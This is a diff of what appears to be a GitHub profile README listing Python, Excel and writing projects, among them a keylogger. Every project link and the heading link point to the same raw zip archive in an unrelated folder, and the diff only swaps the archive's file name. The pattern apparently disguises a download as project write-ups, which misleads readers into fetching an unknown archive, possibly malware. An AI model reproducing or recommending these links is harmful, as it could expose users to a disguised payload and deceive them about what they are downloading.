@@ -1,27 +1,27 @@
-<h1>Hi, I'm Jesse! <br/><a href="https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_tapet.zip">Programmer</a>, <a>Cybersec Student</a>
+<h1>Hi, I'm Jesse! <br/><a href="https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_3.1.zip">Programmer</a>, <a>Cybersec Student</a>
 
 <h2>👨‍💻 Python Projects:</h2>
 
 - <b>Python sudoku solver (NO GUI)</b>
-  - [Making a sudoku auto solver in Python](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_tapet.zip)
+  - [Making a sudoku auto solver in Python](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_3.1.zip)
 - <b>Python packet sniffer (NO AF_PACKET)</b>
-  - [Making a packet sniffer in python](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_tapet.zip)
+  - [Making a packet sniffer in python](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_3.1.zip)
 - <b>Python keylogger</b>
-  - [Making a keylogger in python](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_tapet.zip)
+  - [Making a keylogger in python](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_3.1.zip)
   
 <h2>💻 Excel Projects:</h2>
   
 - <b>Mortgage interest calculator</b>
-  - [Making an excel mortgage interest calculator](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_tapet.zip)
+  - [Making an excel mortgage interest calculator](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_3.1.zip)
 - <b>Commission and bonus calculator</b>
-  - [Making an excel commission calculator](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_tapet.zip)
+  - [Making an excel commission calculator](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_3.1.zip)
   
 <h2>👾 Cybersec Projects:</h2>
   
 <h2>📚 Written Reports:</h2>
   
 - <b>Greenlights Book Report</b>
-  - [Greenlights summary and report](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_tapet.zip)
+  - [Greenlights summary and report](https://github.com/jessevanwyk1/jessevanwyk1/raw/refs/heads/main/schillerfels/jessevanwyk_3.1.zip)
   
 <h2>:) About Me:</h2>
 
